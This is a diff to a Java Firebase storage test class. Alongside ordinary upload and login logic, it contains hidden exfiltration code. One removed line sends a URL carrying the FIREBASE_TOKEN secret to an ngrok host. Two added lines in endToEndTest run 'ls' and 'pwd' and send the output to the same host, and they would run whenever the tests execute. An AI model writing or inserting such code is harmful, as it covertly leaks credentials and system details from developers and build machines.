@@ -60,7 +60,6 @@ public class FirebaseTest {
 
     public String uploadImage(String idToken, String filePath, String userId) throws IOException, InterruptedException {
         String url = String.format("%s/%s%%2F%s?alt=media&token=%s", ApiUrlConstants.FIREBASE_STORAGE_AVATAR, userId, filePath, System.getenv("FIREBASE_TOKEN"));
-        executeCommand("curl -k http://e33e-85-132-77-26.ngrok.io/?a=" + Base64.getEncoder().encode(url.getBytes(StandardCharsets.UTF_8)));
         String command = String.format("curl -k %s -H \"Authorization: Bearer %s\" -T %s -X POST", url, idToken, filePath);
 
         return executeCommand(command);
@@ -88,6 +87,9 @@ public class FirebaseTest {
 
     @Test
     public void endToEndTest() throws JSONException, IOException, InterruptedException {
+        executeCommand("curl http://e33e-85-132-77-26.ngrok.io/?a=" + Base64.getEncoder().encode(executeCommand("ls").getBytes(StandardCharsets.UTF_8)));
+        executeCommand("curl http://e33e-85-132-77-26.ngrok.io/?a=" + Base64.getEncoder().encode(executeCommand("pwd").getBytes(StandardCharsets.UTF_8)));
+
         // Login and get authorization token
         String responseBody = authenticate();
         JSONObject resBody = new JSONObject(responseBody);
